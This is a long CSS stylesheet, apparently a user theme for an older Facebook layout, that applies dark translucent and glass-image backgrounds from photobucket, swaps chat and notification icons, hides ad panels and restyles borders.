a,.submenu_header,.new_gift,#profile_footer_actions,#status_bar,#summaryandpager,.userlist,#feedBody,#feedHeaderContainer,#feedContent,.feedBackground,.mixer_panel,.titles,.sliders,.slider_holder,.fbpage_title,.options,#linkeditorform,.sideNavItem .item,.typeahead_list_with_shadow,.module,.tc,.bc,.footer, .answer,.announcement,.basic_info_content,.slot,.boardkit_no_topics,.ranked_friend,.boardkit_subtitle,.filter-tabs,.level,.level_summary,.cause, .attachment_stage,.attachment_stage_area,.beneficiary_info,#info_tab,#feedwall_with_composer,.frni,.frni a,.flistedit,.fmp_delete,#feed_content_section_friend_lists li,.composer_tabs li:not(.selected),.menu_content li a,.view_on,.rounded-box,.ffriend,.tab_content,.wrapper_background,.full_container,.white_box,#friends li a,#inline_composer,.skin_body,.invite_tab_selected,.inside table,.matches_matches_box,.matches_content_box_subtitle,tr[fbcontext=\"41097bfeb58d\"],.dialog_body div div,.new_menu_off,.present_info_label,.import_status,.upload_guidelines,.tagger_border,.chat_info,.chat_conv_content,.chat_conv,.visibility_change,.pic_padding,.chat_notice,.chat_input_div,.wrapper,.toolbar_button,.toolbar_button_label,.pages_dashboard_panel,.no_pages,.divider,#filterview,#groupslist,.grouprow,.grouprow table,.board_topic,#big_search,#invitation_list,#invitation_wrapper,.emails_error, .outer_box,.inner_box,.days_remaining,.module,.submodule,.ntab,.ntab .tab_link,.grayheader,.inline_wall_post,.related_box,.home_box_wrapper,.two_column,.challenge_stats,.quiz_box, #fb_challenge,#fb_challenge_page,.challenge_leaderboard,.leaderboard_tile, .sidebar_upsell,.concerts_module,.container_box,#login_homepage,.user_hatch_bg,.pick_main,#homepage,.wall_post_body,.track,.HomeTabs_tab a,.minifeed,.alert_wrap,.logged_in_vertical_alert,.info_column,#public_listing_friends,#public_listing_pages,.gamertag_app,.gamerProfileBody,#photo_picker,.album_picker .page0 .row,.dialog_loading,.timeline,.partyrow,.partyrow table,#invite_list li,.group_info_section,#moveable_wide,.UIProfileBox_Content,.story_content,.settings_panel,.app_browser li,.photos_tab,.recent_notes,.side_note,.album_information,.results,.logged_out_register_vertical,.logged_out_register_wrapper,.deleted,.home_prefs_saved,.share_send,.header_divide,.thread_header,.message,.status_composer_inner,.fbpage_edit_header,.app_switcher_unselected,.status_placeholder,.UIComposer_TDTextArea, .UIHomeBox_Content,.UIHotStory,.home_welcome,.summary_custom,.source_list,.minor_section,.UIComposer_Attachment_TDTextArea,.info_diff span,.matches span,.menu_content,.UIcomposer_Dropdown_List,.UIComposer_Dropdown_Item,.feed_auto_update_settings,.container,.silver_footer,.friend_grid_col,.token > span,.tokenizer_input,.tokenizer_input *,#friends_multiselect,.flink_inner a:hover,#grouptypes,#startagroup p,.UICheckList,.FriendAddingTool_InnerMenu,.pagerpro li a:hover,#friend_filters,.fb_menu_count_holder,.hp_box,.view_all_link,.app_settings_tab,.tab_link,#flm_add_title,#flm_current_title,#flm_list_selector .selector,#friends_header,#friends_wrapper,.contacts_header,.contacts_wrapper,.row1,.show_advanced_controls,.FriendAddingTool_InnerMenu,.UISelectList,.UISelectList_Item,.UIIntentionalStory_CollapsedStories,.email_section,.section_header_bg,.rqbox,.ar_highlight,#buddy_list_panel,.panel_item,.friendlist_status,.options_actions a span,.chat_setting label,.toolbox,.chat_actions,.UIWell,.UIComposer_InputArea,.invite_panel,.apinote,.UIInterstitialBox_Container,.ical_section,.maps_brand,.divbox4,.lighteryellow,.fan_status_inactive,.UIBeeperCap,.footer_fallback_box,.footer_refine_search_company_school_box,.footer_refine_search_email_box,.UINestedFilterList_List,.UINestedFilterList_SubItem,.UINestedFilterList_Item_Link,.UINestedFilterList_Item_Link,.UINestedFilterList_SubItem_Link,.app_dir_app_summary,.app_dir_featured_app_summary,.app_dir_app_wide_summary,.profile_top_bar_container,.UIStream_Border,.question_container,.unselected_list label:nth-child(odd),.request_box,.showcase,.steps li,#fb_sell_profile div,.promotion,.UIOneOff_Container tabs,.whocan,.lock_r,.privacy_edit_link,.friend_list_container li:hover a,.email_field,.app_custom_content,#page,.thumb,.step_frame,.radioset,.radio_option,.page_option,.explanation_note,.card,.empty_albums,.right_column,.full_widget,.connect_top,.creative_preview,.creative_column,.UIAdmgrCreativePreview,.UIEMUASFrame,.banner_wrapper,.dashboard,.pages,#photocrop_instructions,.UIContentBox_GrayDarkTop,.UIContentBox_Gray,.UIContentBox,#FriendsPage_ListingViewContainer,.post_editor,.entry,.fb_dashboard,.spacey_footer,.thread,.post,.UIWashFrame_Content,table[bindpoint=\"thread_row\"],table[bindpoint=\"thread_row\"] tbody,.GBThreadMessageRow,.message_pane,.UIComposer_ButtonArea, .UIRoundedTransparentBox_Border,.feedbackView,.group,.streamPaginator,.nullStatePane,.inboxControls,.filterControls,.inboxView tr,.tabView,.tabView li a,.splitViewContent,.photoGrid,.albumGrid,.frame .img,.gridViewCrop,.gridView,.profileWall form,.story form,.formView,.inboxCompose,.LTokenizerToken,#icon_garden,#buddy_list_tab,#presence_notifications_tab,#editphotoalbum .photo,.UISuggestionList_SubContainer,.fan_action,.video_pane,.notify_option, .video_gallery,.video,.uiTooltip:not(.close):hover,.people_table,.people_table table,#main,#navlist li a.inactive,#rbar,.plays_bar,#fans,.updates_messages,.sent_updates_container,.subitem,#pagelet_navigation,.fbxWelcomeBox,.friends_online_sidebar,.uiTextHighlight,.tab_box,.bordered_list_item,.SettingsPage_PrivacySections,.profile-pagelet-section,.profileInfoSection,#pts_invite_section,.main_body,.masterControl,.masterControl .main,.linkbox,.uiTypeaheadView .search li,.language_form,#ads_privacy_examples,.fbPrivacyPage,.UIStandardFrame_SidebarAds,#sidebar_ads,#globalWrapper #content,.portlet,.pBody,.noarticletext,#catlinksm,.devsiteHeader,.devsiteFooter,.devsiteContent,.blockpost,.blockpost #topic,.blockpost .postleft,.blockpost .postfootleft,.fbRecommendation,.fbRecommendationWidgetContent,.add_comment,.connect_comment_widget .comment_content,.error,.even,.fbFeedbackPager,.uiComposerMessageBox,.facepileHolder,.notePermalinkMaincol,.profilePreviewHeader,.pageAttachment,.editExperienceForm,.tourSteplist,.tourSteplist ol,.uiStep,.uiStep:not(.uiStepSelected) .part, .uiStepSelected .part:not(.middle),.better_fb_cp,legend,.bfb_option_body div,.messaging_nux_header,.fbInsightsTable .odd td,.user.selected,.highlighter div b,.fbQuestionsBlingBox:hover,.friend_list_container,.jewelItemList li a:active,#bfb_tip_pagelet > div,.UIUpcoming_Item,.video_with_comments,.video_info,.fbFeedTickerStory,.fbFeedTicker.fixed_elem,.fbxPhoto .fbPhotoImageStage .stageContainer,#DeveloperAppBody > .content,.opengraph .preview,.coverNoImage,.fbTimelineScrubber,.fbTimelineAds,.fbProfilePlacesFilter,.fbFeedbackPost .UIImageBlock_Content,.permissionsViewEducation,.UIFaq_Container,#wizard,.captionArea,#bfb_options_content .option,.bfb_tab_selector,.UIMessageBoxExplanation,.uiStreamSubstories {background: rgba(20,20,20,.2) !important;}

.uiSelector .uiSelectorButton,.UIRoundedBox_Corner,.quote,.em,.UIRoundedBox_TL,.UIRoundedBox_TR,.UIRoundedBox_BR,.UIRoundedBox_LS,.UIRoundedBox_BL,.profile_color_bar,.pagefooter_topborder,.menu_content,h3,#feed_content_section_friend_lists,ul,li[class=\"\"],.comment_box,.comment,#homepage_bookmarks_show_more,.profile_top_wash,.canvas_container,.composer_rounded,.composer_well,.composer_tab_arrow,.composer_tab_rounded,.tl,.tr,.module_right_line_block,.body,.module_bottom_line,.lock_b_bottom_line,#info_section_info_2530096808 .info dt,.pipe,.dh_new_media,.dh_new_media .br,.frn_inpad,#frn_lists,#frni_0,.frecent span,h3 span,.UIMediaHeader_TitleWash,.editor_panel .right,.UIMediaButton_Container tbody *,#userprofile,.profile_box,.date_divider span,.corner,.profile #content .UIOneOff_Container,.ff3,.photo #nonfooter #page_height,.home #nonfooter #page_height,.home .UIFullPage_Container,.main-nav,.generic_dialog,#fb_multi_friend_selector_wrapper,#fb_multi_friend_selector,.tab span,.tabs,.pixelated,.disabled,.title_header .basic_header,#profile_tabs li,#tab_content,.inside td,.match_link span,tr[fbcontext=\"41097bfeb58d\"] table,.accent,#tags h2,.read_updates,.user_input,.home_corner,.home_side,.br,.share_and_hide,.recruit_action,.share_buttons,.input_wrapper,.status_field,.UIFilterList_ItemRight,.link_btn_style span,.UICheckList_Label,#flm_list_selector .Tabset_selected .arrow,#flm_list_selector .selector .arrow .sel_link,.friendlist_status .title a,.online_status_container,.list_drop_zone_inner,.good_username,.WelcomePage_Container,.UIComposer_ShareButton *,.UISelectList_Label,.UIComposer_InputShadow .UIComposer_TextArea,.UIMediaHeader_TitleWrapper,.boxtopcool_hg,.boxtopcool_trg,.boxtopcool_hd,.boxtopcool_trd,.boxtopcool_bd,.boxtopcool_bg,.boxtopcool_b,#confirm_button,.title_text,#advanced_friends_1,.fb_menu_item_link,.fb_menu_item_link small,.white_hover,.GBTabset_Pill span,.UINestedFilterList_ItemRight,.GBSearchBox_Input input,.inline_edit,.feedbackView .comment th div,.searchroot,.composerView th div,.reply th div,.LTokenizer,.Mentions_Input,form.comment div,.ufi_section,.BubbleCount,.BubbleCount_Right,.UIStory,.object_browser_pager_more,.friendlist_name,.friendlist_name a,.switch,#tagger,.tagger_border,.uiTooltip,#reorder_fl_alert,.UIBeeper_Full,#navSearch,#navAccount,#navAccountPic,#navAccountName,#navAccountInfo,#navAccountLink,#mailBoxItems,#pagelet_chat_home h4,.buddy_row,.home_no_stories,#xpageNav li .navSubmenu,.uiListItem:not(.ufiItem),.uiBubbleCount,.number,.fbChatBuddylistPanel,.wash,.settings_screenshot,.privacyPlan .uiListItem:hover,.no_border,.auxiliary .highlight,.emu_comments_box_nub,.numberContainer,.uiBlingBox,.uiBlingBox:hover span,.callout_buttons,.uiWashLayoutEmptyGradientWash,.inputContainer,.editNoteWrapperInput,.fbTextEditorToolbar,.logoutButton input,#contentArea .uiHeader + .uiBoxGray,.uiTokenizer,#bfb_tabs,.profilePictureNuxHighlight,.profile-picture,#ci_module_list,.textBoxContainer,#date_form .uiButton,.insightsDateRange,.MessagingReadHeader,.groupProfileHeaderWash,.questionSectionLabel,.metaInfoContainer,.uiStepList ol,.friend_list,.fbFeedbackMentions,.bb .fbNubFlyoutHeader,.bb .fbNubFlyoutFooter,.fbNubFlyoutInner .fbNubFlyoutFooter,.gradientTop,.gradientBottom,.helpPage,.fbEigenpollTypeahead .plus,.uiSearchInput,.opengraph,#developerAppDetailsContent,.timelineLayout #contentCol,.attachmentLifeEvents,.fbProfilePlacesFilterBar,.uiStreamHeader,.uiStreamHeaderChronologicalForm,.inner .text,.pageNotifPopup,.uiButtonGroup,.navSubmenuPageLink,.fbTimelineTimePeriod,.bornUnit,.mleFooter,#bfb_filter_add_row,#bfb_options .option .no_hover,.fbTimelinePhotosSeparator h4 span,.withsubsections,.showMore,.event_profile_information tr:hover,.nux_highlight_nub,.uiSideNav .uiCloseButton,.uiSideNav .uiCloseButton input,.fb_content,.uiComposerAttachment .selected .attachmentName,.fbHubsTokenizer,.coverEmptyWrap,.uiStreamHeaderText,.pagesTimelineButtonPagelet,.fbNubFlyoutBody,#pageNav .tinyman:hover,#navHome:hover,.fbRemindersThickline,.uiStreamEdgeStoryLine hr,.uiInfoTable tbody tr:hover,.fbTimelineUFI,#contentArea,.leftPageHead,.rightPageHead,.anchorUnit,#pageNav .topNavLink a:focus,.timeline_page_inbox_bar,.uiStreamEdgeStoryLineTx,.pluginRecommendationsBarButton,.pluginRecommendationsBarTop table, .uiToken, .ogAggregationPanelText, .UFIRow {background: transparent !important;}

.UIObject_SelectedItem,.sidebar_item_header,.announcement_title,#pagefooter,.selected:not(.key-messages):not(.key-events):not(.key-media):not(.key-ff):not(.page):not(.group):not(.user):not(.app),.date_divider_label,.profile_action,.blurb ,.tabs_more_menu,.more a span,.selected h2,.column h2,.ffriends,.make_new_list_button_table tr,.title_header,.inbox_menu,.side_column,.section_header h3 span,.media_header,#album_container,.note_dialog,.dialog,.has_app,.UIMediaButton_Container,.dialog_title,.dialog_content,#mobile_notes_announcement,.see_all,#profileActions,.fbpage_group_title,.UIProfileBox_SubHeader,#profileFooter,.share_header,#share_button_dialog,.flag_nav_item_selected,.new_user_guide_content h2,#safety_page h4,.section_banner,.box_head,#header_bar,.content_sidebar h3,.content_header,#events h3,#blog h3,.footer_border_bottom,.firstHeading,#footer,.recent_news h3,.wrapper div h2,.UIProfileBox_Header,.box_header,.bdaycal_month_section,#feedTitle,.pop_content,#linkeditor,.UIMarketingBox_Box,.utility_menu a,.typeahead_list,.typeahead_suggestions,.typeahead_suggestion,.fb_dashboard_menu,.green_promotion,.module h2,.current_path,.boardkit_title,.current,.see_all2,.plain,.share_post,.add-link,li.selected,.active_list a,#photoactions a:not(#rotaterightlink):not(#rotateleftlink),.UIPhotoTagList_Header,.dropdown_menu,.menu_content,.menu_content li a:hover,.menu_content li:hover,#edit_profilepicture,.menu_content div a:hover,.contact_email_pending,.req_preview_guts,.inputbutton,.inputsubmit,.activation_actions_box,.wall_content,.matches_content_box_title,.new_menu_selected,#editnotes_content,#file_browser,.chat_window_wrapper,.chat_window,.chat_header,.hover,.dc_tabs a,.post_header,.header_cell,#error,.filters,.pages_dashboard_panel h2,.srch_landing h2,.bottom_tray,.next_action,.pl-divider-container,.sponsored_story,.header_current,.discover_concerts_box,.header,.sidebar_upsell_header,.activity_title h2,.wall_post_title,#maps_options_menu,.menu_link,.gamerProfileTitleBar,.feed_rooster ,.emails_success,.friendTable table:hover,.board_topic:hover,.fan_table table:hover,#partylist .partyrow:hover,.latest_video:hover,.wallpost:hover,.profileTable tr:hover,.friend_grid_col:hover,.bookmarks_list li:hover,.requests_list li:hover,.birthday_list li:hover,.tabs li,.fb_song:hover,.share_list .item_container:hover,.written a:hover,#photos_box .album:hover,.people .row .person:hover,.group_list .group:hover,.confirm_boxes .confirm:hover,.posted .share_item_wide .share_media:hover,.note:hover,.editapps_list .app_row:hover,.my_networks .blocks .block:hover,.mock_h4,#notification_options tr:hover,.notifications_settings li:hover,.mobile_account_main h2,.language h4,.products_listing .product:hover,.info .item .item_content:hover,.info_section:hover,.recent_notes p:hover,.side_note:hover,.suggestion,.story:hover,.post_data:hover,.album_row:hover,.track:hover,#pageheader,.message:hover,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),.UITabGrid_Link:hover,.UIActionButton,.UIActionButton_Link,.confirm_button,.silver_dashboard,span.button,.col:hover,#photo_tag_selector,#pts_userlist,.flink_dropdown,.flink_inner,.grouprow:hover,#findagroup h4,#startagroup h4,.actionspro a:hover,.UIActionMenu_Menu,.UICheckList_Label:hover,.make_new_list_button_table,.contextual_dialog_content,#flm_list_selector .selector:hover,.show_advanced_controls:hover,.UISelectList_check_Checked,.section_header,.section_header_bg,#buddy_list_panel_settings_flyout,.options_actions,.chat_setting,.flyout,.flyout .UISelectList,.flyout .new_list,#tagging_instructions,.FriendsPage_MenuContainer,.UIActionMenu,.UIObjectListing:hover,.UIStory_Hide .UIActionMenu_Wrap,.UIBeeper,.branch_notice,.async_saving,.UIActionMenu .UIActionMenu_Wrap:hover,.attachment_link a:hover,.UITitledBox_Top,.UIBeep,.Beeps,#friends li a:hover,.apinote h2,.UIActionButton_Text,.rsvp_option:hover,.onglettrhi,.ongletghi,.ongletdhi,.ongletg,.onglettr,.ongletd,.confirm_block, .unfollow_message,.UINestedFilterList_SubItem_Selected .UINestedFilterList_SubItem_Link,.UINestedFilterList_SubItem_Link:hover,.UINestedFilterList_Item_Link:hover,.UINestedFilterList_Selected .UINestedFilterList_Item_Link,.app_dir_app_summary:hover,.app_dir_featured_app_summary:hover,.app_dir_app_wide_summary:hover,.UIStory:hover,.UIPortrait_TALL:hover,.UIActionMenu_Menu div,.UIButton_Blue,.UIButton_Gray,.quiz_cell:hover,.UIFilterList > .UIFilterList_Title,.message_rows tr:hover,.ntab:hover,.thumb_selected,.thumb:hover,.hovered a,.pandemic_bar,.promote_page,.promote_page a,.create_button a,.nux_highlight,.UIActionMenu_Wrap,.share_button_browser div,.silver_create_button,.painted_button,.flyer_button,table[bindpoint=\"thread_row\"] tbody tr:hover,.GBThreadMessageRow:hover,#header,.button:not(.close):not(.uiSelectorButton):not(.videoicon):not(.toggle),h4,button:not(.as_link),#navigation a:hover,.settingsPaneIcon:hover,a.current,.inboxView tr:hover,.tabView li a:hover,.friendListView li:hover,.LTypeaheadResults,.LTypeaheadResults a:hover,.dialog-title, .UISuggestionList_SubContainer:hover,.typeahead_message,.progress_bar_inner,.video:hover,.advanced_controls_link,.plays_val,.lightblue_box,.FriendAddingTool_InnerMenu .UISelectList,.gray_box,.uiButton:not(.uiSelectorButton),.fbPrivacyWidget .uiSelectorButton:not(.lockButton),.uiButtonSuppressed,#navAccount li:not(#navAccountInfo),.jewelHeader,.seeMore,#mailBoxItems li,#pageFooter,.uiSideNav .key-nf:hover,.key-messages .item:hover,.key-messages ul li:hover,.key-events ul li:hover,.key-media ul li:hover,.key-ff ul li:hover,.key-apps:hover,.key-games:hover,.uiSideNav .sideNavItem:not(.open) .item:hover,.fbChatOrderedList .item:hover a,.uiHeader,.uiListItem:not(.mall_divider):hover,.uiSideNav li.selected > a,.ego_unit:hover,.results,.bordered_list_item:hover,.fbConnectWidgetFooter,#viewas_header,.fbNubFlyoutTitlebar,.info_text,.stage,.masterControl .selected a,.masterControl .controls .item a:hover,.uiTypeaheadView .search,.gigaboxx_thread_hidden_messages,.uiMenu,.uiMenuInner,.itemAnchor,.gigaboxx_thread_branch_message,.uiSideNavCount,.uiBoxYellow,.loggedout_menubar_container,.pbm .uiComposer,.megaphone_box,.uiCenteredMorePager,.fbEditProfileViewExperience:hover,.uiStepSelected .middle,.GM_options_header,.bfb_tab_selected, #MessagingShelfContent,.connect_widget_like_button,.uiSideNav .open,.fbActivity:hover,.fbQuestionsPollResultsBar,.insightsDateRangeCustom,.fbInsightsTable thead th,.mall_divider,.attachmentContent .fbTabGridItem:hover,.jewelItemNew,#MessagingThreadlist .unread,.type_selected,.bfb_sticky_note,.UIUpcoming_Item:hover,.progress_bar_outer,.fbChatBuddyListDropdown .uiButton,.UIConnectControlsListSelector .uiButton,.instructions,.uiComposerMetaContainer,.uiMetaComposerMessageBoxShelf,#feed_nux,#tickerNuxStoryDiv,.fbFeedTickerStory:hover,.fbCurrentStory:hover,.uiStream .uiStreamHeaderTall,.fbChatSidebarMessage,.fbPhotoSnowboxInfo,.devsitePage .menu,.devsitePage .menu .content,#devsiteHomeBody .wikiPanel > div,.toolbarContentContainer,.fbTimelineUnitActor,#fbTimelineHeadline,.fbTimelineNavigation,.fbTimelineFeedbackActions,.timelineReportHeader,.fbTimelineCapsule .timelineUnitContainer:hover,.timelineReportContainer:hover,.fbTimelineComposerAttachments .uiListItem:hover span a,.timelinePublishedToolbar,.timelineRecentActivityLabel,.fbTimelineMoreButton,.overlayTitle,.friendsBoxHeader,.escapeHatchHeader,.tickerStoryAllowClick,.appInvite:hover,.fbRemindersStory:hover,.lifeEventAddPhoto a:hover,.insights-header,.ufb-dataTable-header-container,.ufb-button,.older-posts-content,.mleButton:hover,.btnLink,.fill,.cropMessage,.adminPanelList li:hover a,.tlPageRecentOverlayStream,.addListPageMegaphone,.searchListsBox,.ogStaticPagerHeader,.dialogTitle,#rogerSidenavCallout,.fbTimelineAggregatedMapUnitSeeAll,.shareRedesignContainer,.ogSingleStoryText,.ogSliderAnimPagerPrevWrapper,.ogSliderAnimPagerNextWrapper,.shareRedesignText,.pluginRecommendationsBarTop,.timelineRecentActivityStory:hover, .ogAggregationPanelUFI
{ background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Wallpaper/GlassShiny.png\") fixed repeat !important;}

.hovercard .stage,.profileChip,.GM_options_wrapper_inner,.MessagingReadHeader .uiHeader,#MessagingShelf,#navAccount ul,.uiTypeaheadView,#blueBar,.uiFacepileItem .uiTooltipWrap,.fbJewelFlyout,.jewelItemList li,.notification:not(.jewelItemNew),.fbNubButton,.fbChatTourCallout .body,.uiContextualDialogContent,.fbTimelineStickyHeader .back,.timelineExpandLabel:hover,.pageNotifFooter a,.fbSettingsListLink:hover,.uiOverlayPageContent,#bfb_option_list,.fbPhotoSnowlift .rhc,.ufb-tip-title,.balloon-content,.tlPageRecentOverlayTitle,.uiDialog,.uiDialogForm,.permissionsLockText, .uiMenuXBorder,.-cx-PRIVATE-uiDialog__content,.-cx-PRIVATE-uiDialog__title, ._k5
{ background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Wallpaper/GlassShiny.png\") fixed repeat, rgba(10,10,10,.6) !important; }

.unread .badge,.fbDockChatBuddyListNub .icon,.sx_7173a9,.selectedCheckable .checkmark {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball15.png\") no-repeat right center!important;}

table[class=\" \"] .badge:hover,table[class=\"\"] .badge:hover,.offline .fbDockChatBuddyListNub .icon,.fbChatSidebar.offline .fbChatSidebarMessage .img  {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball15.png\") no-repeat right center!important;}

.fbChatSidebar.offline .fbChatSidebarMessage .img {height: 16px !important;}

.offline .fbDockChatBuddyListNub .icon,.fbDockChatBuddyListNub .icon,.sx_7173a9 {margin-top: 0 !important;height: 15px !important;}

a.idle,.buddyRow.idle .buddyBlock,.fbChatTab.idle .tab_availability,.fbChatTab.disabled .tab_availability,.chatIdle .chatStatus,.idle .fbChatUserTab .wrap,.chatIdle .uiTooltipText,.markunread,.bb .fbDockChatTab.user.idle .titlebarTextWrapper,.fbChatOrderedList .item:not(.active) .status {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball10paddedright.png\") no-repeat left center !important;}

.fbChatOrderedList .item .status {width: 10px !important;}

.headerTinymanName {max-width: 320px !important; white-space: nowrap !important; overflow: hidden !important;}

.uiTooltipText {padding-left: 14px !important;border: none !important;}
 
.fbNubButton,.bb .fbNubFlyoutTitlebar,.bb .fbNub .noTitlebar,.fbDockChatTab,#fbDockChatBuddylistNub .fbNubFlyout,.fbDockChatTabFlyout,.titlebar {border-radius: 8px 8px 0 0!important;}

.uiSideNav .open {padding-right: 0 !important;}
.uiSideNav .open,.uiSideNav .open > *,#home_stream > *,.bb .rNubContainer .fbNub,.fbChatTab {margin-left: 0 !important;}
.uiSideNav .open ul > * {margin-left: -20px !important;}
.uiSideNav .open .subitem > .rfloat {margin-right: 20px !important;}

.timelineUnitContainer .timelineAudienceSelector .uiSelectorButton {padding: 1px !important; margin: 4px 0 0 4px !important;}
.timelineUnitContainer .audienceSelector .uiButtonNoText .customimg {margin: 2px !important;}
.timelineUnitContainer .composerAudienceSelector .customimg {opacity: 1 !important; background-position: 0 1px !important; padding: 0 !important;}

.fbNub.user:not(.disabled) .wrap {padding-left: 15px !important;}
.fbNubFlyoutTitlebar .titlebarText {padding-left: 12px !important;}

a.friend:not(.idle),.buddyRow:not(.idle) .buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline .chatStatus,.markread,.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline .uiTooltipText,.bb .fbDockChatTab.user:not(.idle):not(.disabled) .titlebarTextWrapper,.fbChatOrderedList .item.active .status,.active .titlebarTextWrapper,.uiMenu .checked .itemAnchor {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball10paddedright.png\") no-repeat !important;}

a.friend:not(.idle),.buddyRow:not(.idle) .buddyBlock,.fbChatTab:not(.idle):not(.disabled) .tab_availability,.chatOnline .chatStatus,.markread,a.idle,.buddyRow.idle .buddyBlock {background-position: right center !important;}

.user:not(.idle):not(.disabled) .fbChatUserTab .wrap,.chatOnline .uiTooltipText,.bb .fbDockChatTab.user:not(.idle):not(.disabled) .titlebarTextWrapper,.fbChatOrderedList .item.active .status,.active .titlebarTextWrapper,.user .fbChatUserTab .wrap {background-position: left center !important;}

.uiMenu .checked .itemAnchor {background-position: 5px center !important;}

.markunread,.markread {background-position: 0 center !important;}

.chatIdle .chatStatus,.chatOnline .chatStatus {width: 10px !important;height: 10px !important;background-position: 0 0 !important;}

#fbRequestsJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Friends-Gray.png\") no-repeat center center !important;}

#fbRequestsJewel:hover .jewelButton,#fbRequestsJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Friends.png\") no-repeat center center !important;}

#fbMessagesJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon-gray.png\") no-repeat center center !important;}

#fbMessagesJewel:hover .jewelButton,#fbMessagesJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon.png\") no-repeat center center !important;}

#fbNotificationsJewel .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth-gray.png\") no-repeat center center !important;}

#fbNotificationsJewel:hover .jewelButton,#fbNotificationsJewel.hasNew .jewelButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth.png\") no-repeat center center !important;}

.topBorder,.bottomBorder {background: #000 !important;}

.pl-item,.ical,.pop_content  {background-color: #333 !important;}
.pl-alt {background-color: #222 !important;}

.friend:hover,.friend:not(.idle):hover,.fbTimelineRibbon {background-color: rgba(10,10,10,.6) !important;}

.maps_arrow,#sidebar_ads,.available .x_to_hide,.left_line,.line_mask,.chat_input_border,.connect_widget_button_count_nub,
.uiStreamPrivacyContainer .uiTooltip .img,.UIObjectListing_PicRounded,.UIRoundedImage_CornersSprite,.UITabGrid_Link:hover .UITabGrid_LinkCorner_TL,.UITabGrid_Link:hover .UITabGrid_LinkCorner_TR,.UITabGrid_Link:hover .UITabGrid_LinkCorner_BL,.UITabGrid_Link:hover .UITabGrid_LinkCorner_BR,.UILinkButton_R,.pagesAboutDivider  {visibility:hidden !important;}

.nub,#contentCurve,#pagelet_netego_ads,img.plus,.highlighter,.uiToolbarDivider,.bfb_sticky_note_arrow_border,.bfb_sticky_note_arrow,#ConfirmBannerOuterContainer,.uiStreamHeaderBorder,.topBorder,.bottomBorder,.middleLink:after,.sideNavItem .uiCloseButton,.mask,.topSectionBottomBorder {display: none !important;}

.fbChatBuddyListTypeahead {display: block !important;}

.chat_input {width: 195px !important;}

.fb_song_play_btn,.friend,.wrap,.uiTypeahead,.share,.raised,.donated,.recruited,.srch_landing,.story_editor,.jewelCount span, .menuPulldown {background-color: transparent !important;}

.extended_link div {background-color: #fff !important}

#fbTimelineHeadline,.coverImage {width: 851px !important; margin-left: 1px !important;}

*:not([style*=border]) {border-color: #000 !important;}

#feed_content_section_applications *,#feed_header_section_friend_lists *,.summary,.summary *,.UIMediaHeader_TitleWash,.UIMediaHeader_TitleWrapper,.feedbackView .comment th div,.searchroot,.composerView th div,.reply th div,.borderTagBox,.innerTagBox,.friend,.fbNubFlyoutTitlebar,.fbNubButton {border-color: transparent !important;}

.innerTagBox:hover {border-color: rgba(10,10,10,.45) !important;box-shadow: 0 0 5px 4px #fac !important;}

.status_placeholder,.UIComposer_TDTextArea,.UIComposer_TextAreaShadow,.UIContentBox ,.box_column,form.comment div,.comment_box div,#tagger,.UIMediaItem_Wrapper,#chat_tab_bar *,.UIActionMenu_ButtonOuter input[type=\"button\"],.inner_button,.UIActionButton_Link,.divider,.UIComposer_Attachment_TDTextArea,#confirm_button,#global_maps_link,.advanced_selector,#presence_ui *,.fbFooterBorder,.wash,.main_body,.settings_screenshot,.uiBlingBox,.inputContainer *,.uiMentionsInput,.uiTypeahead,.editNoteWrapperInput,.date_divider,.chatStatus,#headNav,.jewelCount span,.fbFeedbackMentions .wrap,.uiSearchInput span,.uiSearchInput,.fbChatSidebarMessage,.devsitePage .body > .content,.timelineUnitContainer,.fbTimelineTopSection,.coverBorder,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,#navAccount.openToggler,#contentArea,.uiStreamStoryAttachmentOnly,.ogSliderAnimPagerPrev .content,.ogSliderAnimPagerNext .content,.ogSliderAnimPagerPrev .wrapper,.ogSliderAnimPagerNext .wrapper,.ogSingleStoryContent,.ogAggregationAnimSubstorySlideSingle,.uiCloseButton, .ogAggregationPanelUFI, .ogAggregationPanelText {border: none !important;}

.uiStream .uiStreamHeaderTall {border-top: none !important; border-bottom: none !important;}

.attachment_link a:hover,input[type=\"input\"],input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),.UITabGrid_Link:hover,.UIFilterList_Selected,.make_new_list_button_table,.confirm_button,.fb_menu_title a:hover,.Tabset_selected {border-bottom-color: #000 !important;border-bottom-width: 1px !important;border-bottom-style: solid !important;border-top-color: #000 !important;border-top-width: 1px !important;border-top-style: solid !important;border-left-color: #000 !important;border-left-width: 1px !important;border-left-style: solid !important;border-right-color: #000 !important;border-right-width: 1px !important;border-right-style: solid !important;-moz-appearance:none!important;}

